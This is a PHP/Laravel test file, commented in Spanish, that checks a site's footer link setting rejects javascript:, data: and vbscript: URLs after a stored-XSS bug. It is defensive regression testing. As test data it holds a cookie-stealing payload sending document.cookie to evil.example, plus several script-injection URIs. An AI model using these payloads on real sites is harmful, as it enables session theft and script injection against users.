<?php

namespace Tests\Feature;

use App\Models\Setting;
use Database\Seeders\SettingSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Los ajustes del sitio se trataban todos como texto libre, pero algunos
 * terminan dentro de un `href` del sitio público. `{{ }}` escapa las comillas
 * —no se puede salir del atributo— pero no filtra el esquema, así que un
 * `javascript:` guardado en «Sitio de Asobares Nacional» se ejecutaba al
 * pulsar el enlace del pie, presente en todas las páginas.
 */
class EnlacesDeAjustesTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(SettingSeeder::class);
    }

    private function fijarEnlaceNacional(string $valor): void
    {
        Setting::where('clave', 'url_nacional')->update(['valor' => $valor]);
        Setting::olvidarCache();
    }

    public function test_el_pie_no_pinta_un_enlace_con_esquema_javascript(): void
    {
        $this->fijarEnlaceNacional('javascript:fetch("https://evil.example/?c="+document.cookie)');

        $respuesta = $this->get('/');

        $respuesta->assertSuccessful();
        $respuesta->assertDontSee('javascript:', escape: false);
    }

    public function test_el_pie_tampoco_pinta_un_data_uri(): void
    {
        $this->fijarEnlaceNacional('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==');

        $this->get('/')->assertDontSee('data:text/html', escape: false);
    }

    public function test_un_enlace_normal_si_se_pinta(): void
    {
        $this->fijarEnlaceNacional('https://asobares.org');

        $this->get('/')->assertSee('https://asobares.org', escape: false);
    }

    /** @return array<string, array{string, bool}> */
    public static function esquemas(): array
    {
        return [
            'https' => ['https://asobares.org', true],
            'http' => ['http://asobares.org', true],
            'javascript' => ['javascript:alert(1)', false],
            'data' => ['data:text/html,<script>alert(1)</script>', false],
            'vbscript' => ['vbscript:msgbox(1)', false],
            'relativo' => ['/interno', false],
            'vacío' => ['   ', false],
        ];
    }

    #[DataProvider('esquemas')]
    public function test_el_filtro_de_esquema(string $url, bool $aceptado): void
    {
        $this->assertSame($aceptado, enlaceSeguro($url) !== null, "Con «{$url}».");
    }
}
